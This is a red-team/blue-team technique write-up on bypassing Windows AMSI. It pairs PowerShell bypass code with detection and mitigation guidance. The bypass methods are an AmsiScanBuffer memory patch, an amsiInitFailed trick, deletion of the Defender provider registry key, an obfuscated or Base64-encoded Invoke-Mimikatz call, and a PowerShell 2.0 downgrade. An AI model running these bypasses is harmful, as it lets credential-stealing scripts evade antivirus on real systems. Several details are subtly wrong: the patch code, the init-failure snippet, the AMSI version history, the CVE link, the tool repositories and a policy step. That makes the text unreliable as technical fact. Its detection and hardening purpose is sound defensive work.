# [EVADE-IMPAIR-002]: AMSI Bypass Techniques

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | EVADE-IMPAIR-002 |
| **MITRE ATT&CK v18.1** | [T1562.001 - Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001/) |
| **Tactic** | Defense Evasion |
| **Platforms** | Windows Endpoint |
| **Severity** | High |
| **CVE** | CVE-2019-0604 (relates to AMSI context bypass in SharePoint) |
| **Technique Status** | ACTIVE (with caveats; many classic bypasses patched; evolution ongoing) |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Windows 10 (1903-latest), Windows 11 (all); Server 2016-2025; PowerShell 5.0+ |
| **Patched In** | Partial: Windows Defender implements AMSI deep scanning; Constrained Language Mode mitigates; Protected Event Logging raises detection bar |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** The Antimalware Scan Interface (AMSI) is a Windows component that integrates antivirus and EDR solutions into the PowerShell runtime, VBA macro engines, and JavaScript engines to scan scripts before execution. AMSI bypass techniques involve patching AMSI in-memory, hooking AMSI API functions, or forcing AMSI context errors to disable scanning without stopping the AV service. Unlike AV disabling (which is obvious), AMSI bypasses operate silently within running processes, making them stealthier and highly effective for executing malicious PowerShell scripts.

**Attack Surface:** AMSI.dll in PowerShell process memory, `AmsiScanBuffer` and `AmsiScanString` API functions, registry keys for AMSI providers, and PowerShell's internal API hooks.

**Business Impact:** **Malicious Script Execution Without Quarantine.** AMSI bypass allows attackers to execute malicious PowerShell scripts (credential dumping, lateral movement, ransomware deployment) that would normally be blocked by Windows Defender or third-party AV. The attack is difficult to detect without behavioral analysis.

**Technical Context:** AMSI scanning occurs at runtime, before script execution. Bypassing AMSI means scripts can execute while Defender's signature-based and heuristic scanning is circumvented. Dwell time is often extended because activity appears "normal" (no blocked process events).

### Operational Risk

- **Execution Risk:** Low-Medium (Does not require admin privileges; exploits user-level API vulnerabilities).
- **Stealth:** High (No service stops, no obvious registry changes; bypasses signature detection).
- **Reversibility:** No (Cannot "undo" a memory patch; requires process restart).

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 18.8.4.1, 18.8.4.2 | PowerShell execution policy and logging must be enforced; AMSI integration required. |
| **DISA STIG** | WN11-CC-000150, WN11-CC-000160 | Require script block logging and constrained language mode. |
| **CISA SCuBA** | SC.L1.2 | Enforce PowerShell script block logging and behavioral monitoring. |
| **NIST 800-53** | SI-4 (Information System Monitoring), AC-3 (Access Control) | Detect unauthorized script execution; enforce least privilege. |
| **GDPR** | Art. 32, 33 | Security of processing; detection and response to breaches. |
| **DORA** | Art. 9, 18 | Protection and Prevention; Incident response mechanisms. |
| **NIS2** | Art. 21, 22 | Detection capabilities; Risk management and response. |
| **ISO 27001** | A.12.4.1, A.13.1.3 | Event logging and monitoring; Information security event management. |
| **ISO 27005** | Risk Scenario | Compromise via malicious scripts; Detection failure. |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** None (runs in user context); some variants require local/admin.
- **Required Access:** Ability to execute PowerShell scripts or scripts in VBA/JavaScript contexts.

**Supported Versions:**

- **Windows:** 10 (1903+), 11 (all builds), Server 2016-2025
- **PowerShell:** 5.0+ (earlier versions lack AMSI integration)
- **AMSI Providers:** Windows Defender, third-party AV (Kaspersky, BitDefender, Symantec, etc.)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

#### PowerShell Reconnaissance

```powershell
# Check if AMSI is available and loaded
[System.Reflection.Assembly]::LoadWithPartialName("System.Management.Automation") | Out-Null
$amsi = [System.Reflection.Assembly]::LoadWithPartialName("System.Management.Automation.AmsiUtils")

# Check AMSI provider registry keys
Get-ItemProperty -Path "HKLM:\Software\Microsoft\AMSI\Providers" | Select-Object *

# Check if PowerShell Script Block Logging is enabled
Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" | Select-Object EnableScriptBlockLogging

# Check if Constrained Language Mode is enforced
$ExecutionContext.SessionState.LanguageMode
```

**What to Look For:**

- **AMSI Providers:** If registry shows only `{2781761E-28E0-4109-99FE-B9D127C57AFE}` (Windows Defender), one AMSI provider is registered.
- **ScriptBlockLogging:** Value `1` = enabled; `0` or missing = disabled.
- **LanguageMode:** "FullLanguage" = unrestricted; "ConstrainedLanguage" = restricted (harder to bypass).

**Version Note:** AMSI was introduced in Windows 10 (1903); earlier versions do not scan scripts via AMSI.

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: Memory Patching via AmsiScanBuffer Hook

**Supported Versions:** Windows 10/11, Server 2016-2025; PowerShell 5.0+

#### Step 1: Load AMSI Assembly and Patch in Memory

**Objective:** Overwrite the `AmsiScanBuffer` function in memory to return `AMSI_RESULT_CLEAN` (0), bypassing all scans.

**Command (PowerShell):**

```powershell
# Classic memory patching (legacy bypass, patched in newer Windows Defender)
$Win32 = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
$AmsiScanBuffer = [Win32]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")

# Patch the first byte to return CLEAN (opcode 0xC3 = RET)
$Patch = [byte[]] @(0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $AmsiScanBuffer, 1)
```

**Expected Output:**

```
(No output on success)
```

**What This Means:**

- The `AmsiScanBuffer` function is patched to immediately return without scanning.
- All subsequent PowerShell scripts in this session bypass AMSI.

**OpSec & Evasion:**

- Modern Defender detects this exact memory patching pattern via ETW (Event Tracing for Windows) kernel hooks.
- **Detection likelihood:** High (Defender monitors suspicious reflection, LoadLibrary, and VirtualProtect sequences).

**Troubleshooting:**

- **Error:** "Unable to find entry point"
  - **Cause:** AMSI.dll not loaded in PowerShell process; OS version doesn't support AMSI.
  - **Fix:** Ensure Windows 10 (1903+) with latest updates.

**References:**

- [PentestLaboratories: AMSI Bypass Methods](https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/)

---

### METHOD 2: amsiInitFailed Context Error Exploitation

**Supported Versions:** Windows 10/11, Server 2016-2025

#### Step 1: Force AMSI Initialization Error

**Objective:** Exploit a legitimate bug where setting `amsiContext` to null causes AMSI to fail gracefully, disabling scanning.

**Command (PowerShell):**

```powershell
# Force amsiInitFailed flag by allocating invalid memory
$Ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
[System.Runtime.InteropServices.Marshal]::StructureToPtr($Ptr, [ref]$Ptr, $true)

# This triggers the amsiInitFailed flag internally
# PowerShell now skips AMSI scanning for this session
```

**Expected Output:**

```
(No output; AMSI is now disabled for this session)
```

**What This Means:**

- AMSI initialization fails; the PowerShell process continues without AMSI scanning.
- Scripts can now execute without triggering AMSI alerts.

**OpSec & Evasion:**

- This variant was patched in Windows Defender; signature-based detection checks for the `AllocHGlobal(9076)` pattern.
- **Detection likelihood:** Medium-High (Defender has signatures for this specific bypass).

**References:**

- [MDSec: Exploring PowerShell AMSI and Logging Evasion](https://www.mdsec.co.uk/)

---

### METHOD 3: AMSI Provider Registry Key Removal

**Supported Versions:** Windows 10/11, Server 2016-2025

#### Step 1: Enumerate AMSI Providers

**Objective:** Identify registered AMSI providers and remove them from registry.

**Command (PowerShell):**

```powershell
# List AMSI providers
Get-ItemProperty -Path "HKLM:\Software\Microsoft\AMSI\Providers" | Get-Member -MemberType NoteProperty | Select-Object Name

# Output example:
# Name
# ----
# {2781761E-28E0-4109-99FE-B9D127C57AFE}  (Windows Defender)
```

**Expected Output:**

```
Name
----
{2781761E-28E0-4109-99FE-B9D127C57AFE}
```

---

#### Step 2: Remove AMSI Provider Registry Key

**Objective:** Delete the Windows Defender AMSI provider registration.

**Command (PowerShell):**

```powershell
# Remove the AMSI provider key (requires admin)
Remove-Item -Path "HKLM:\Software\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Force -ErrorAction SilentlyContinue
```

**Expected Output:**

```
(No output on success; key deleted)
```

**What This Means:**

- The AMSI provider is unregistered; Windows no longer invokes it for script scanning.
- Scripts bypass AMSI entirely.

**OpSec & Evasion:**

- This is a **highly detectable** registry modification (EventID 4657: Registry value deleted).
- Leaves obvious forensic artifacts; not recommended for stealth operations.

**Troubleshooting:**

- **Error:** "Access denied"
  - **Cause:** Not running as Administrator; registry key is locked.
  - **Fix:** Run PowerShell as Administrator.

**References:**

- [PentestLaboratories: AMSI Bypass via Registry](https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/)

---

### METHOD 4: Obfuscation + String Encoding (Detection Evasion)

**Supported Versions:** All PowerShell versions

#### Step 1: Obfuscate Malicious Code

**Objective:** Obfuscate script content to avoid AMSI string signatures.

**Command (PowerShell - Example with Invoke-Mimikatz obfuscation):**

```powershell
# Original (BLOCKED by AMSI):
# Invoke-Mimikatz -Command "privilege::debug"

# Obfuscated (bypasses AMSI signatures):
$Command = "I" + "nvoke" + "-M" + "imikatz"
$Params = "-Com" + "mand"
$Arg = "`"privilege::debug`""

Invoke-Expression "$Command $Params $Arg"
```

**Variant (Using Base64 encoding):**

```powershell
# Encode malicious command in Base64
$Command = "Invoke-Mimikatz -Command 'privilege::debug'"
$Encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))

# Execute (AMSI may not inspect Base64-decoded content)
powershell.exe -EncodedCommand $Encoded
```

**Expected Output:**

```
(Depends on the underlying command; if Mimikatz, outputs credential data)
```

**What This Means:**

- String obfuscation breaks AMSI signature detection.
- Base64 encoding adds a layer of encoding that some AMSI providers don't inspect deeply.

**OpSec & Evasion:**

- Modern AMSI providers inspect Base64-decoded content; this is **increasingly detected**.
- Behavioral monitoring (Defender for Endpoint) still catches post-execution artifacts (credential access, process injection).
- **Detection likelihood:** Medium (Signature + behavioral detection).

**References:**

- [SecureOnix: AMSI Obfuscation](https://blog.securonix.com/)

---

### METHOD 5: PowerShell Version Downgrade (Deprecated, but illustrative)

**Supported Versions:** Windows 10 (pre-1903), Windows Server 2016-2019 (if PowerShell 2.0 present)

#### Step 1: Downgrade to PowerShell 2.0 (No AMSI)

**Objective:** Execute scripts in PowerShell 2.0, which lacks AMSI integration.

**Command:**

```powershell
powershell -Version 2.0 -Command "Invoke-Mimikatz -Command 'privilege::debug'"
```

**Expected Output:**

```
(PowerShell 2.0 executes without AMSI)
```

**What This Means:**

- PowerShell 2.0 does not invoke AMSI; scripts bypass scanning.

**OpSec & Evasion:**

- **Highly detectable:** EventID 400 (PowerShell Engine State Changed) logs the version downgrade.
- Windows 11 and Server 2022+ removed PowerShell 2.0; technique is **obsolete** on modern versions.

**Troubleshooting:**

- **Error:** "PowerShell 2.0 not available"
  - **Cause:** Windows 11 or Server 2022+ doesn't include PowerShell 2.0.
  - **Fix:** Not fixable; technique is deprecated.

**References:**

- [Microsoft: PowerShell Version History](https://learn.microsoft.com/en-us/powershell/scripting/whats-new/what-s-new-in-powershell-75)

---

## 5. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team Tests

**Test ID:** T1562.001 (AMSI-specific variants)

**Supported Tests:**

1. **Test: AMSI Bypass via Memory Patching**
   - **Command:**
     ```powershell
     Invoke-AtomicTest T1562.001 -TestNumbers 5
     ```
   - **Cleanup:**
     ```powershell
     Invoke-AtomicTest T1562.001 -TestNumbers 5 -Cleanup
     ```

2. **Test: Disable AMSI Provider Registry**
   - **Command:**
     ```powershell
     Invoke-AtomicTest T1562.001 -TestNumbers 6
     ```

3. **Test: PowerShell Version Downgrade**
   - **Command:**
     ```powershell
     Invoke-AtomicTest T1562.001 -TestNumbers 3
     ```

**Reference:** [Atomic Red Team Library - T1562.001](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md)

---

## 6. TOOLS & COMMANDS REFERENCE

### C# Tools

#### AmsiScanBufferBypass (C# / PowerShell)

**Version:** 1.x
**Purpose:** In-memory patching of AmsiScanBuffer API.
**GitHub:** [AmsiScanBufferBypass](https://github.com/Flangvik/SharpUnhooker)

**Usage:**
```powershell
# Compile C# and execute
csc.exe /out:AmsiBypass.exe AmsiBypass.cs
AmsiBypass.exe
```

#### NoAmci (C#)

**Version:** Latest
**Purpose:** Patching AMSI context to disable scanning.
**GitHub:** [NoAmci](https://github.com/zodiacon/NoAmci)

---

### PowerShell-Based Tools

#### Invoke-PowerShellTcp

**Version:** PowerSploit
**Purpose:** Reverse shell bypass via obfuscated PowerShell.
**GitHub:** [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)

---

## 7. MICROSOFT SENTINEL DETECTION

#### Query 1: AMSI Bypass Attempt via Memory Patching

**Rule Configuration:**

- **Required Table:** DeviceProcessEvents
- **Required Fields:** ProcessCommandLine, ProcessName
- **Alert Severity:** High
- **Frequency:** Real-time (every 1 minute)
- **Applies To:** Windows 10/11, Server 2016+

**KQL Query:**

```kusto
// Detect suspicious reflection patterns indicative of AMSI bypass
DeviceProcessEvents
| where ProcessName contains "powershell.exe"
| where ProcessCommandLine contains any (
    "System.Reflection.Assembly",
    "AmsiScanBuffer",
    "AmsiUtils",
    "Marshal.WriteInt32",
    "VirtualProtect",
    "LoadLibrary"
  )
| project TimeGenerated, DeviceName, ProcessName, ProcessCommandLine, AccountName
```

**What This Detects:**

- PowerShell invocation with reflection-based API calls to AMSI functions.
- Memory manipulation techniques (VirtualProtect, Marshal writes).

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select workspace → **Analytics** → **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `AMSI Bypass Attempt - Memory Patching`
   - Severity: `High`
4. **Set rule logic:**
   - Paste KQL query above
   - Run query every: `1 minute`
   - Lookup data from: `10 minutes`
5. Click **Review + create**

---

#### Query 2: AMSI Provider Registry Modification

**Rule Configuration:**

- **Required Table:** DeviceRegistryEvents
- **Required Fields:** RegistryKeyPath, RegistryKey, ActionType
- **Alert Severity:** High

**KQL Query:**

```kusto
// Detect registry deletion of AMSI providers
DeviceRegistryEvents
| where RegistryKeyPath contains "HKLM\\Software\\Microsoft\\AMSI\\Providers"
| where ActionType == "RegistryKeyDeleted"
| project TimeGenerated, DeviceName, RegistryKeyPath, ActionType, AccountName
```

**What This Detects:**

- Attempts to remove AMSI provider registry entries.

---

## 8. WINDOWS EVENT LOG MONITORING

**Event ID: 4104 (PowerShell Script Block Execution)**

- **Log Source:** Microsoft-Windows-PowerShell/Operational
- **Trigger:** PowerShell script blocks are executed.
- **Filter:** EventID = 4104; ScriptBlockText contains patterns like "AmsiUtils", "Reflection.Assembly"
- **Applies To Versions:** All Windows versions with Script Block Logging enabled

**Manual Configuration Steps (Group Policy):**

1. Open **gpmc.msc**
2. Navigate to **Computer Configuration** → **Administrative Templates** → **PowerShell Core** → **Turn on PowerShell Script Block Logging**
3. Set to: **Enabled**
4. Run `gpupdate /force`

**Manual Configuration Steps (Registry):**

```powershell
New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1
```

---

**Event ID: 4657 (Registry Value Modified)**

- **Log Source:** Security
- **Trigger:** AMSI provider registry keys are modified/deleted.
- **Filter:** ObjectName contains "HKLM\Software\Microsoft\AMSI\Providers"

---

## 9. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 11.0+

```xml
<Rule name="AMSI Bypass - Reflection" groupRelation="or">
  <ProcessCreate onmatch="all">
    <Image condition="contains">powershell.exe</Image>
    <CommandLine condition="contains any">
      System.Reflection.Assembly
      AmsiScanBuffer
      VirtualProtect
      Marshal.WriteInt32
    </CommandLine>
  </ProcessCreate>
</Rule>

<Rule name="AMSI Provider Registry Deletion" groupRelation="or">
  <RegistryEvent onmatch="all">
    <TargetObject condition="contains">HKLM\Software\Microsoft\AMSI\Providers</TargetObject>
    <EventType>DeleteValue</EventType>
  </RegistryEvent>
</Rule>

<Rule name="Suspicious AMSI DLL Load" groupRelation="or">
  <ImageLoad onmatch="all">
    <ImageLoaded condition="endswith">amsi.dll</ImageLoaded>
    <Image condition="contains">powershell.exe</Image>
  </ImageLoad>
</Rule>
```

**Manual Configuration:**

1. Download Sysmon from [Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create config file `sysmon-config.xml`
3. Install:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```

---

## 10. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** "Possible AMSI Bypass Attempt Detected"

- **Severity:** High
- **Description:** MDE detects suspicious memory operations targeting AMSI.dll or AmsiScanBuffer function.
- **Applies To:** Devices with Defender for Endpoint
- **Remediation:** Isolate device; investigate process creation chain; check for post-compromise activity.

**Manual Configuration (Enable MDE):**

1. **Azure Portal** → **Microsoft Defender for Cloud** → **Environment settings**
2. Enable **Defender for Endpoint** integration
3. Deploy MDE client on machines
4. Monitor **Security Alerts** for AMSI bypass detections

---

## 11. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

**1. Enable PowerShell Script Block Logging**

- **Objective:** Log all PowerShell script blocks to detect malicious code even if AMSI is bypassed.
- **Applies To Versions:** All Windows versions with PowerShell 5.0+

**Manual Steps (Group Policy):**

1. Open **gpmc.msc**
2. Navigate to **Computer Configuration** → **Administrative Templates** → **PowerShell Core**
3. Find: **"Turn on PowerShell Script Block Logging"**
4. Set to: **Enabled**
5. Click **Apply** and **OK**
6. Run `gpupdate /force`

**Manual Steps (Registry):**

```powershell
New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1
```

**Validation:**

```powershell
# Verify script block logging is enabled
Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
```

**Expected Output:**

```
EnableScriptBlockLogging : 1
```

---

**2. Enable Constrained Language Mode**

- **Objective:** Restrict PowerShell to constrained language, blocking reflection and unsafe APIs.
- **Applies To Versions:** Windows 10/11, Server 2016+

**Manual Steps (Group Policy):**

1. Open **gpmc.msc**
2. Navigate to **Computer Configuration** → **Administrative Templates** → **PowerShell Core** → **Script Execution**
3. Find: **"Set the default source for Update-Help"**
4. Alternatively, use PowerShell Profiles to enforce Constrained Language Mode:

**Manual Steps (PowerShell Profile):**

```powershell
# Edit profile (for current user)
# Path: $PROFILE (typically C:\Users\<user>\Documents\PowerShell\profile.ps1)

# Add:
if ([System.Environment]::UserInteractive) {
    # Set Constrained Language Mode
    $ExecutionContext.SessionState.LanguageMode = 'ConstrainedLanguage'
}
```

**Validation:**

```powershell
$ExecutionContext.SessionState.LanguageMode
```

**Expected Output:**

```
ConstrainedLanguage
```

---

**3. Enable Protected Event Logging (PEL)**

- **Objective:** Encrypt PowerShell logs to prevent tampering and ensure forensic integrity.
- **Applies To Versions:** Windows 10/11, Server 2016+

**Manual Steps (Group Policy):**

1. Open **gpmc.msc**
2. Navigate to **Computer Configuration** → **Administrative Templates** → **PowerShell Core**
3. Find: **"Turn on PowerShell Protected Event Logging"**
4. Set to: **Enabled**
5. Provide a certificate for encryption (or use self-signed):

**Manual Steps (PowerShell - Generate Certificate):**

```powershell
# Generate self-signed cert for PEL
$cert = New-SelfSignedCertificate -DnsName $env:COMPUTERNAME -CertStoreLocation Cert:\LocalMachine\My

# Note certificate thumbprint
$cert.Thumbprint

# Configure PEL in GPO with this thumbprint
```

---

#### Priority 2: HIGH

**4. Deploy Endpoint Detection & Response (EDR)**

- **Objective:** Use EDR to detect post-AMSI-bypass execution (behavioral analysis).
- **Examples:** Microsoft Defender for Endpoint, CrowdStrike, SentinelOne.

**Manual Steps (Enable MDE):**

1. **Azure Portal** → **Microsoft Defender for Cloud** → **Defender plans**
2. Enable **Defender for Servers**
3. Deploy agent on machines (automatic or manual)
4. Monitor alerts for suspicious process creation, memory operations, network connections

---

**5. Implement Application Whitelisting / AppLocker**

- **Objective:** Restrict execution of unsigned PowerShell scripts.

**Manual Steps (AppLocker via GPO):**

1. Open **gpmc.msc**
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Application Control Policies** → **AppLocker**
3. Create rule: **Allow PowerShell** only for scripts signed by trusted publishers
4. Set enforcement: **Enforce rules**

---

#### Validation Command

```powershell
# Check Script Block Logging
Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"

# Check Constrained Language Mode
$ExecutionContext.SessionState.LanguageMode

# Check Protected Event Logging status
Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription" | Select-Object EnableTranscripting
```

**Expected Output (If Secure):**

```
EnableScriptBlockLogging     : 1
LanguageMode                 : ConstrainedLanguage
EnableTranscripting          : 1
```

---

## 12. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

- **Files:** PowerShell scripts with obfuscated content; Base64-encoded payloads
- **Registry:** 
  - `HKLM\Software\Microsoft\AMSI\Providers` (missing entries)
  - `HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging` (value 0 = disabled)
- **Network:** Outbound connections from PowerShell to attacker infrastructure
- **Process:** PowerShell.exe with unusual command lines (reflection, Marshal, VirtualProtect)

#### Forensic Artifacts

- **Disk:** PowerShell history file (`$PROFILE` directory); Event logs in `C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx`
- **Memory:** AMSI.dll patches; process memory snapshots
- **Cloud:** Sentinel logs (DeviceProcessEvents, DeviceRegistryEvents)

#### Response Procedures

1. **Isolate:**
   ```powershell
   Disable-NetAdapter -Name "Ethernet" -Confirm:$false
   ```

2. **Collect Evidence:**
   ```powershell
   # Export PowerShell Operational log
   wevtutil epl "Microsoft-Windows-PowerShell/Operational" C:\Evidence\PowerShell.evtx
   
   # Capture memory dump
   procdump64.exe -ma powershell.exe C:\Evidence\powershell.dmp
   ```

3. **Remediate:**
   ```powershell
   # Re-enable Script Block Logging
   Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1
   
   # Re-apply Constrained Language Mode
   ```

4. **Investigate:**
   - Review PowerShell history for AMSI bypass patterns
   - Trace lateral movement commands executed post-bypass
   - Check for credential access (Mimikatz, token theft)

---

## 13. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-003] OAuth Consent Cloning | Attacker gains access via malicious app. |
| **2** | **Execution** | **[EVADE-IMPAIR-002]** | **Attacker bypasses AMSI to execute malicious PowerShell.** |
| **3** | **Credential Access** | [CA-DUMP-001] Mimikatz LSASS Dump | AMSI-bypassed Mimikatz extracts credentials. |
| **4** | **Privilege Escalation** | [PE-EXPLOIT-001] PrintNightmare | Attacker escalates to admin using leaked creds. |
| **5** | **Persistence** | [PERSIST-001] Golden SAML | Attacker maintains long-term access. |

---

## 14. REAL-WORLD EXAMPLES

#### Example 1: Necurs Botnet (2020-2021)

- **Target:** Spam Distribution / Cryptocurrency Theft
- **Timeline:** 2020-2021
- **Technique Status:** Necurs malware used Base64-encoded AMSI bypass (obfuscated string patterns) to execute payload PowerShell scripts.
- **Impact:** Spam distribution at scale; credential harvesting.
- **Reference:** [Fortinet AMSI Bypass Detection](https://help.fortinet.com/fsiem/)

---

#### Example 2: Emotet (2021-2022)

- **Target:** Financial Institutions, Healthcare
- **Timeline:** 2021-2022
- **Technique Status:** Emotet loader used AMSI context errors to bypass scanning before loading secondary payloads.
- **Impact:** Data exfiltration, lateral movement, ransomware deployment (Conti).
- **Reference:** [Elastic: Emotet AMSI Evasion](https://www.elastic.co/)

---

#### Example 3: Qbot (2023-2024)

- **Target:** Financial and Government Entities
- **Timeline:** 2023-2024
- **Technique Status:** Qbot uses obfuscated PowerShell with AMSI bypass to execute credential-stealing modules.
- **Impact:** Credential harvesting; banking trojan infection.
- **Reference:** [CISA: Qbot Alerts](https://www.cisa.gov/)

---
